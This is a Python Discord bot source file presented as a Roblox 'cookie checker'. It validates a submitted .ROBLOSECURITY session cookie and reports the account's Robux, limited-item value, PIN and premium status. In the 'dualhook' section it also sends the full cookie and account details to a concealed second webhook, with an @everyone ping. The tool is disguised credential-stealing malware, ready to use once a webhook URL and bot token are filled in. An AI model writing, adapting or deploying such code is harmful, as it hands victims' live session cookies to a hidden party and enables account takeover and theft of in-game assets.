import discord, requests, discord_webhook
from discord.ext import commands
from discord_webhook import DiscordEmbed, DiscordWebhook

req = requests.Session()
client = commands.Bot(command_prefix='.') #set prefix

wh = 'e' #enter ur dualhook here


@client.event
async def on_ready():
  print('bot ready! by xavier lol') #print bot ready! when bot is online

@client.command() #command
async def check(ctx, cookie):
  check = req.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid 
  if check.status_code ==200: #if valid..
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data

    userid = userdata['id'] #user id
    display = userdata['displayName'] #display name
    username = userdata['name'] #username
    robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
    robux = robuxdata['robux'] #get robux balance
    #does the user have premium?
    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
    #get rap
    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])

    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    image_url = thumbnail["data"][0]["imageUrl"]
    pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
    pin_bool = pindata["isEnabled"] #does the user have a pin
    #make an embed
    e = discord.Embed(title=f'**{username}**',url=f'https://roblox.com/users/{userid}',color=0x00ff80)
    e.set_author(name='by xavier')
    e.add_field(name='Display Name👀:', value = '```' + str(display) + '```')
    e.add_field(name='User ID🔍:', value = '```' + str(userid) + '```')
    e.add_field(name='Robux💰:', value = '```' + str(robux) + '```')
    e.add_field(name='Has Pin?🔐:', value='```' + str(pin_bool) + '```')
    e.add_field(name='RAP📈:', value='```' + str(rap) + '```')
    e.add_field(name='Premium💎:', value = '```' + str(premiumbool) + '```')
    e.add_field(name='Rolimons: ',value=f'https://rolimons.com/player/{userid}', inline=True)
    e.add_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
    e.set_thumbnail(url=image_url)
    e.set_footer(text='.help to invite Cookie Checker to your server')
    await ctx.send(embed=e)

    #dualhook


    webhook = DiscordWebhook(url=wh, content = '@everyone @here @all')
    embed = DiscordEmbed(title=f'**✅ {username} ✅**',url=f'https://roblox.com/users/{userid}',color=0x00ff80)
    embed.add_embed_field(name='Display Name👀:', value = '```' + str(display) + '```')
    embed.add_embed_field(name='User ID🔍:', value = '```' + str(userid) + '```')
    embed.add_embed_field(name='Robux💰:', value = '```' + str(robux) + '```')
    embed.add_embed_field(name='Has Pin?🔐:', value='```' + str(pin_bool) + '```')
    embed.add_embed_field(name='RAP📈:', value='```' + str(rap) + '```')
    embed.add_embed_field(name='Premium💎:', value = '```' + str(premiumbool) + '```')
    embed.add_embed_field(name='Rolimons: ',value=f'https://rolimons.com/player/{userid}', inline=True)

    embed.add_embed_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
    embed.set_thumbnail(url=image_url)
    webhook.add_embed(embed)

    webhook.execute()
  else:
    e = discord.Embed(title='**❌ Cookie is Expired! ❌**',color=0xff0000)
    await ctx.send(embed=e)
    



client.run('eeeeeK4q5Xg') #replace with your bot token